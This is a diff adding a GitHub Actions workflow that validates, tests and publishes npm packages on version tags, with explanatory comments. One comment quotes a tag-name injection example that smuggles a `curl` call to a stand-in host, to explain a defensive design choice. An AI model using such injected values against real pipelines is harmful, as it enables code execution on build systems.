@@ -1,0 +1,154 @@
+name: Release
+
+# Pushing a tag publishes; everything else rehearses.
+#
+# A tag is the record of what shipped, and the job below refuses to run if the
+# tag disagrees with the version in package.json — the two cannot drift. A
+# manual run never publishes: it packs, validates, and runs `npm publish
+# --dry-run`, so a release can be rehearsed against the real registry
+# responses without spending a version number.
+#
+# npm refuses to republish a version, so a failed release is not simply
+# retryable: whatever went out stays out, and the version is burned. Almost
+# everything in this file exists to move failures BEFORE the first publish.
+on:
+  push:
+    tags: ["v*"]
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  # Required for `npm publish --provenance`: npm exchanges this short-lived
+  # OIDC token for a signed attestation linking the tarball to this workflow
+  # run and this commit. Without it the publish fails rather than silently
+  # producing an unattested package.
+  id-token: write
+
+concurrency:
+  # Two releases publishing at once would interleave on the registry, and the
+  # second would fail partway through on versions the first had already
+  # taken. Never cancel in progress — a half-published release is worse than
+  # a queued one.
+  group: release
+  cancel-in-progress: false
+
+jobs:
+  release:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-node@v4
+        with:
+          # The floor every package declares in `engines`. Releasing on the
+          # oldest supported runtime is the point: a build that only works on
+          # newer Node would ship silently otherwise.
+          node-version: "22"
+          cache: npm
+          registry-url: https://registry.npmjs.org
+
+      - run: npm ci
+
+      - name: Resolve the release version
+        id: version
+        # GITHUB_REF_NAME is read as a shell variable, never interpolated by
+        # Actions into the script text. A tag name is attacker-controlled by
+        # anyone who can push a tag, and `${{ }}` substitution happens before
+        # bash sees the line — so a tag like `v1.0.0"; curl evil; #` would
+        # execute. Reading "$GITHUB_REF_NAME" keeps it data.
+        #
+        # It is then matched against strict semver before going any further,
+        # which rejects both a crafted name and an ordinary typo like `v0.1`.
+        env:
+          EVENT_NAME: ${{ github.event_name }}
+        shell: bash
+        run: |
+          set -euo pipefail
+          if [ "$EVENT_NAME" = "push" ]; then
+            version="${GITHUB_REF_NAME#v}"
+            publish=true
+          else
+            version="$(node -p "require('./packages/core/package.json').version")"
+            publish=false
+          fi
+
+          if ! printf '%s' "$version" | grep -Eq '^[0-9]+\.[0-9]+\.[0-9]+(-[0-9A-Za-z.]+)?$'; then
+            echo "::error::Refusing to release: \"$version\" is not a semver version. Tag as vMAJOR.MINOR.PATCH."
+            exit 1
+          fi
+
+          echo "version=$version" >> "$GITHUB_OUTPUT"
+          echo "publish=$publish" >> "$GITHUB_OUTPUT"
+          echo "Release version: $version (publish=$publish)"
+
+      # Static checks first: they need no build and no network, so the fastest
+      # failures happen first.
+      - name: Validate release metadata
+        env:
+          RELEASE_VERSION: ${{ steps.version.outputs.version }}
+        run: node scripts/release-check.mjs --expect-version "$RELEASE_VERSION"
+
+      - run: npm run format:check
+      - run: npm run build
+      - run: npm run typecheck:tests
+
+      - name: Run the full test suite
+        # `shell: bash` for pipefail — see ci.yml's long note. Without it the
+        # step reports `tee`'s exit status and a failing suite would publish.
+        shell: bash
+        run: npm test 2>&1 | tee /tmp/release-suite.log
+
+      - name: Verify the container-backed suites actually ran
+        # A narrower version of ci.yml's check, kept because it guards the one
+        # thing that matters here: the PostgreSQL and browser-loop suites skip
+        # themselves when no container runtime is present, and a skip looks
+        # exactly like a pass in the summary. Publishing on the back of a run
+        # where the real-database coverage silently vanished is precisely the
+        # failure this job exists to prevent. ci.yml asserts more, on every
+        # push; this asserts the load-bearing part, on the thing being shipped.
+        shell: bash
+        run: |
+          set -euo pipefail
+          if grep -q "SKIPPED, no container runtime" /tmp/release-suite.log; then
+            echo "::error::Integration suites skipped for lack of a container runtime — refusing to publish."
+            exit 1
+          fi
+
+      # Re-run with --require-dist now that the build has happened, so a
+      # package whose build produced no entry point fails here rather than
+      # partway through publishing.
+      - name: Validate the built artifacts
+        env:
+          RELEASE_VERSION: ${{ steps.version.outputs.version }}
+        run: node scripts/release-check.mjs --expect-version "$RELEASE_VERSION" --require-dist
+
+      - name: Rehearse the publish
+        if: steps.version.outputs.publish == 'false'
+        run: node scripts/publish-packages.mjs --dry-run
+
+      - name: Publish to npm
+        if: steps.version.outputs.publish == 'true'
+        env:
+          # Consumed by npm via the .npmrc that setup-node's registry-url
+          # writes. Create the secret as an npm **automation** token: a
+          # granular or classic token with 2FA required cannot publish from
+          # CI.
+          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}
+        run: node scripts/publish-packages.mjs --provenance
+
+      - name: Summary
+        if: always()
+        env:
+          RELEASE_VERSION: ${{ steps.version.outputs.version }}
+          DID_PUBLISH: ${{ steps.version.outputs.publish }}
+        shell: bash
+        run: |
+          {
+            echo "### Release ${RELEASE_VERSION:-unknown}"
+            echo
+            if [ "${DID_PUBLISH:-false}" = "true" ]; then
+              echo "Published from tag \`${GITHUB_REF_NAME:-}\`."
+            else
+              echo "Dry run — nothing was published."
+            fi
+          } >> "$GITHUB_STEP_SUMMARY"
